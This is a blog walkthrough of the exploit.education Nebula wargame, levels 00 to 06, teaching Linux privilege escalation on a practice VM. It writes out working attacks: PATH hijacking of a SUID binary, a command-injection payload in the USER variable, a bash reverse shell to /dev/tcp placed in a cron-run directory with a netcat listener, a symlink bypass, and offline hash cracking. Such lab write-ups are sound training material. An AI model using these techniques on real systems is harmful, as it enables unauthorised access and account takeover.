@@ -1,0 +1,360 @@
+# Nebula 00-06
+
+# Introduction
+
+So you have been procrastinating on the Internet and you ended up here, huh? I’m happy that happened! Now stop being lazy and stay to read this awesome post, you won’t regret it (and maybe even you learn a couple of things).
+
+I have been looking for some resources to learn exploit development recently, and I found an awesome site called [exploit.education](http://exploit.education/), my purpose today is to go through some of the exercises with you, and leave some more for the future.
+
+I have to warn you this is pretty basic stuff, so if you are a seasoned veteran that has hacked Google a couple of times I wouldn’t waste much time in here… However, if that’s not the case, feel free to skip the walkthrough for the exercises that you find too simple, but pay special attention to those that you couldn’t solve, because those will provide the true learning experience.
+
+Having said this, I find it necessary to warn you that reading this article won’t be very useful unless you have already faced the exercises, so do yourself a favor and have a look at them, try your hardest, and then come back so I can enlighten you.
+
+# Let’s hack!
+
+## level00
+
+This first one is pretty much a joke so I will speed run through it.
+
+> This level requires you to *find* a Set User ID program that will run as the “flag00” account. You could also find this by carefully looking in top level directories in / for suspicious looking directories.
+> 
+
+We are basically being asked to find a program with the SUID bit set (I will explain this in level01).
+
+By looking at the `find` [manual](https://www.man7.org/linux/man-pages/man1/find.1.html), we can quickly find that the switch we are looking for is `-perm`, then by providing the argument `/4000` we specifically look for files with the sticky bit set (a.k.a. SUID bit).
+
+![Untitled](../images/Nebula0006/Untitled.png)
+
+## level01
+
+I’m glad you are still here after that first level, I promise this one is cooler.
+
+In level01 we are asked to find a vulnerability in the source code below :
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  gid_t gid;
+  uid_t uid;
+  gid = getegid();  //get group identity
+  uid = geteuid();  //get user identity
+
+  setresgid(gid, gid, gid);  //set real, effective, and saved user or group ID
+  setresuid(uid, uid, uid);  //set real, effective, and saved user or group ID
+
+  system("/usr/bin/env echo and now what?");
+}
+```
+
+In case you want to do some research on each one of the functions, here I list the man pages you can check :
+
+- [getegit](https://man7.org/linux/man-pages/man2/getgid.2.html)
+- [geteuid](https://man7.org/linux/man-pages/man2/getuid.2.html)
+- [setresgid & setresuid](https://man7.org/linux/man-pages/man2/setresuid.2.html)
+    
+    
+
+Another part of the code you might not be familiar with is `char **envp`. This argument is called the environment pointer. It contains all of the environment variables. As simple as it sounds.
+
+Finally, `/usr/bin/env` will search for a binary in the directories listed in the PATH environment variable and execute the first one it finds.
+
+By this point you should understand the entire program we have been given, so let’s have a look at the files that are inside the directory :
+
+![Untitled](../images/Nebula0006/Untitled%201.png)
+
+As you can see, the `flag01` binary is listed with the permissions `-rwsr-x—-`. I don’t want to spend too much time explaining Linux file permissions since I consider the topic quite trivial, so [here’s a guide I liked](https://linuxhandbook.com/linux-file-permissions/).
+
+One thing to highlight though, is the `s` permission, also known as “The super famous SUID bit”. Okay, it’s just called SUID bit, but it is truly awesome what it can do for a hacker!
+
+When the SUID bit is set on a file that is executable, it means that the file will be executed with the permissions of the owner of that file. Putting this in simpler terms, if a file is owned by user X and it has the SUID bit set, it will always be executed as X, no matter who runs it.
+
+Therefore, we know that the executable file `flag01` will be run as the flag01 user, which is the account we want to break into.
+
+So what if we could spawn a shell through the `flag01` binary? That’s right, the shell would be spawned with the flag01 account. So let’s dive right into it!
+
+As I mentioned earlier, `/usr/bin/env` will look for a binary named `echo` contained in one of the directories of the PATH variable, so let’s look at the contents of PATH :
+
+![Untitled](../images/Nebula0006/Untitled%202.png)
+
+Sadly, we do not have any write permissions on any of those directories, so what can we do?
+
+We know we do have write permissions in the `/tmp` directory (This is just the default configuration because `/tmp` is where all the temporary files go when a program is executing, so any user can write there), hence an idea that we can try out is to create a “fake” `echo` there that will do whatever we want, and add the `/tmp` directory to the PATH. It is important that `/tmp` is the first directory of the PATH, since we know `/usr/bin/env` will look through the directories in order and will grab the first binary it finds. 
+
+![Untitled](../images/Nebula0006/Untitled%203.png)
+
+`echo.c`  will spawn a shell through a system call :
+
+```c
+int main() { system("/bin/sh"); return 0; }
+```
+
+When called by the `flag01` binary, `echo` will spawn a shell with the account flag01 (becuase the program has the sticky bit set).
+
+![Untitled](../images/Nebula0006/Untitled%204.png)
+
+And that is how easy it is! Let’s move on…
+
+## level02
+
+Once again, we need to find a vulnerability in the following program :
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char *buffer;
+
+  gid_t gid;
+  uid_t uid;
+
+  gid = getegid();
+  uid = geteuid();
+
+  setresgid(gid, gid, gid);
+  setresuid(uid, uid, uid);
+
+  buffer = NULL;
+
+  asprintf(&buffer, "/bin/echo %s is cool", getenv("USER"));
+  printf("about to call system(\"%s\")\n", buffer);
+  
+  system(buffer);
+}
+```
+
+[asprintf](https://www.man7.org/linux/man-pages/man3/asprintf.3.html) will allocate the the formatted string in the `buffer`, and notice that it will substitute `%s` with the USER environment variable.
+
+This program allows us to exploit a vulnerability called [Command Injection](https://owasp.org/www-community/attacks/Command_Injection), which allows the attacker to execute arbitrary commands on the host OS.
+
+The USER variable is retrieved from the environment that the program is being executed in, and modifying it is a piece of cake for the attacker. If you have been paying attention, you have already seen how I modified the PATH variable in level01, but we all have bad days, so I will show you again just in case :
+
+```c
+export VAR=value
+```
+
+By injecting a `/bin/bash` call into the USER env variable, we can once again spawn a shell for the user flag02 thanks to the program having the SUID set.
+
+![Untitled](../images/Nebula0006/Untitled%205.png)
+
+Have a look at how the payload I use is `;/bin/bash;/bin/echo`, which will make the formatted string have the following content : “/bin/echo ;/bin/bash;/bin/echo is cool”. Thus the system call will call `echo` to print nothing (empty `echo` prints a new line character but whatever), then it will call `/bin/bash` as flag02, and then finish with the last echo command.
+
+## level03
+
+In this level we find a directory and a script. Both are owned by the flag03 user and we know there is a crontab that is called every couple of minutes (The exercise tells us so, and we can assume that it is the script `writable.sh` that will be run every couple of minutes).
+
+![Untitled](../images/Nebula0006/Untitled%206.png)
+
+`writable.sh` :
+
+```bash
+#!/bin/sh
+
+for i in /home/flag03/writable.d/* ; do
+        (ulimit -t 5; bash -x "$i")
+        rm -f "$i"
+done
+```
+
+The script executes each file that is in the `writable.d` directory, and then deletes such file. 
+
+- `ulimit -t` Specifies a process' maximum running time, in seconds.
+- `bash -x` only executes the file if it is an executable.
+
+> Each process has a set of resource limits that can be used to restrict the amounts of
+various system resources that the process may consume. For example, we may want
+to set resource limits on a process before executing an arbitrary program, if we are
+concerned that it may consume excessive resources. We can set the resource limits
+of the shell using the *ulimit* built-in command (limit in the C shell). These limits are
+inherited by the processes that the shell creates to execute user commands. - The Linux Programming Interface
+> 
+
+Since the `writable.sh` script is scheduled in the crontab and it has flag03 user permisisons, we can write a script that generates a reverse shell (run by flag03) and put it inside the `writable.d` directory. In here, we want a reverse shell because the process is limited to 5 seconds with `ulimit`, so if we only call `/bin/bash` locally, we won’t have time to do pretty much anything.
+
+So we create the script that generates the reverse shell :
+
+```bash
+#!/bin/bash
+bash -i >& /dev/tcp/<@IP>/<Port> 0>&1
+```
+
+This script needs to have executable permissions or it won’t be called (Due to `-x`).
+
+`chmod +x shell.sh`
+
+Now we can set up a `netcat` listener with `nc -nlvp <port>` and just wait for the crontab to execute `writable.sh`.
+
+As said, the script is run with flag03 permissions and we get our shell :
+
+![Untitled](../images/Nebula0006/Untitled%207.png)
+
+Just to show that there is no magic going on, I logged in with the nebula user (the godmode for this machine) and we can see a crontab that shows [writable.sh](http://writable.sh) is executed every 3 minutes.
+
+![Untitled](../images/Nebula0006/Untitled%208.png)
+
+## level04
+
+Here comes a fairly easy one. This exercise requires us to read the `token` file, and to do so we need to bypass the following program’s check :
+
+```c
+#include <stdlib.h>
+#include <unistd.h>
+#include <string.h>
+#include <sys/types.h>
+#include <stdio.h>
+#include <fcntl.h>
+
+int main(int argc, char **argv, char **envp)
+{
+  char buf[1024];
+  int fd, rc;
+
+  if(argc == 1) {
+      printf("%s [file to read]\n", argv[0]);
+      exit(EXIT_FAILURE);
+  }
+
+  if(strstr(argv[1], "token") != NULL) {
+      printf("You may not access '%s'\n", argv[1]);
+      exit(EXIT_FAILURE);
+  }
+
+  fd = open(argv[1], O_RDONLY);
+  if(fd == -1) {
+      err(EXIT_FAILURE, "Unable to open %s", argv[1]);
+  }
+
+  rc = read(fd, buf, sizeof(buf));
+  
+  if(rc == -1) {
+      err(EXIT_FAILURE, "Unable to read fd %d", fd);
+  }
+
+  write(1, buf, rc);
+}
+```
+
+This is what we find in the directory we are given :
+
+![Untitled](../images/Nebula0006/Untitled%209.png)
+
+`flag04` is what we have the source code of, and since it has the SUID bit set, it has permissions to read the `token` file when executed.
+
+First off, let’s check what the `strstr` function does…
+
+```c
+**char *strstr(const char ****haystack***, const char ****needle***);**
+```
+
+> The strstr() function finds the first occurrence of the substring needle in the string haystack.  The terminating null bytes ('\0') are not compared. - [strstr(3) — Linux manual page](https://www.man7.org/linux/man-pages/man3/strstr.3.html)
+> 
+
+For our concern, this means that the check done by `flag04` consists of looking for the substring “token” inside the string we provide as an argument. In case this comparison is positive, we will be presented with the generous message "You may not access '%s'\n", which is lame.
+
+What we can easily see though, is that the check specifically looks for the string “token”, so what if we can somehow access the file with another name?
+
+With the use of a symbolic link, we can create an alias for the file, which means we can bypass the check and read that slippery token!
+
+> Like a normal link, a symbolic link provides an alternative name for a file. But
+whereas a normal link is a filename-plus-pointer entry in a directory list, a symbolic
+link is a specially marked file containing the name of another file. (In other words,
+a symbolic link has a filename-plus-pointer entry in a directory, and the file referred
+to by the pointer contains a string that names another file.) This latter file is often
+called the target of the symbolic link, and it is common to say that the symbolic link
+“points” or “refers” to the target file. When a pathname is specified in a system call,
+in most circumstances, the kernel automatically dereferences (or synonymously,
+follows) each symbolic link in the pathname, replacing it with the filename to which
+it points. This process may happen recursively if the target of a symbolic link is
+itself a symbolic link. (The kernel imposes limits on the number of dereferences to
+handle the possibility of circular chains of symbolic links.) If a symbolic link refers
+to a file that doesn’t exist, it is said to be a dangling link. - The Linux Programming Interface
+> 
+
+In Linux, symlinks are created with :
+
+```c
+ln -s <file> <link>
+```
+
+![Untitled](../images/Nebula0006/Untitled%2010.png)
+
+I thought we would have gotten a coupon or something fancy… Guess we will have to move to the next level.
+
+## level05
+
+We keep building up our fundamentals. level05 is all about understanding directory permissions.
+
+Let’s see what we find…
+
+![Untitled](../images/Nebula0006/Untitled%2011.png)
+
+The `.backup` directory has `r-x` permissions for world, which means we are given access. We know this directory shouldn’t be accessible, but a little peek inside won’t hurt anyone, right?
+
+Listing the contents we find a compressed archive :
+
+![Untitled](../images/Nebula0006/Untitled%2012.png)
+
+We can decompress it into `/tmp` (Other directories will raise a “permission denied” error) :
+
+![Untitled](../images/Nebula0006/Untitled%2013.png)
+
+To everyone’s surprise, we see there is an ssh [private key](https://en.wikipedia.org/wiki/Public-key_cryptography) :
+
+![Untitled](../images/Nebula0006/Untitled%2014.png)
+
+Which of course we can use to log in as flag05 and get the flag. To log in through [ssh](https://en.wikipedia.org/wiki/Secure_Shell) when we have a key in a file, we can use the following command :
+
+```c
+ssh flag05@<nebula's @IP> -i id_rsa
+```
+
+![Untitled](../images/Nebula0006/Untitled%2015.png)
+
+Note for the future : Do not store private keys in publicly accessible directories.
+
+## level06
+
+We have reached the last exercise for today (sad face). The information we have for this level is that the credentials of the account we need to pwn come from a legacy unix system.
+
+I was afraid this moment would arrive, but it is time for a little history class.
+
+Nowadays, Linux stored the users’ credentials through the combination of two different files, `/etc/passwd`, and `/etc/shadow`. The first contains some information about the accounts, and typically everyone can read it, whilst the latter stores the hashes of the passwords for each user and only root has access to it.
+
+Nevertheless, in old systems, everything was stored in one single file, namely `/etc/passwd`.
+
+As you will see in this exercise, this file contained some account information for each user, among which is the hash for everyone’s password.
+
+By looking directly for the line that contains the account for the flag06 user, we can extract the hash, which has the value `ueqwOCnSGdsuM`.
+
+![Untitled](../images/Nebula0006/Untitled%2016.png)
+
+We can store this hash in a file and then crack it with [john the ripper](https://www.openwall.com/john/doc/). Since this hash is by no means complicated to crack, `john` will find the result almost instantly :
+
+![Untitled](../images/Nebula0006/Untitled%2017.png)
+
+And now all we need to do is log in with user `flag06` and password `hello`.
+
+![Untitled](../images/Nebula0006/Untitled%2018.png)
+
+# Conclusion
+
+This has been everything for today. I think something very important can be learnt from this article (apart from the technical stuff), and that is the importance of fundamentals. I am going to be honest here, this exercises are way too easy to compare with real-world stuff, however, I think it is vital to understand everything from its base, and this levels provide some significant knowledge in a fun way. 
+
+My goal is to go through the entire Nebula series with different posts that will come in the future, and then move on to more advanced and cooler stuff. However, I don’t want to saturate the site with exercises, so the posts won’t come one straight up after the other, I will just upload them occasionally, in between different topics.
+
+As always, thank you very much for having reached the end of today’s publication. Feel free to contact me in case you have any doubts or want to leave any kind of feedback. Take care!
+
+### References
+
+- The Linux Programming Interface*,* Michael Kerrisk.
+- [exploit.education](http://exploit.education/)
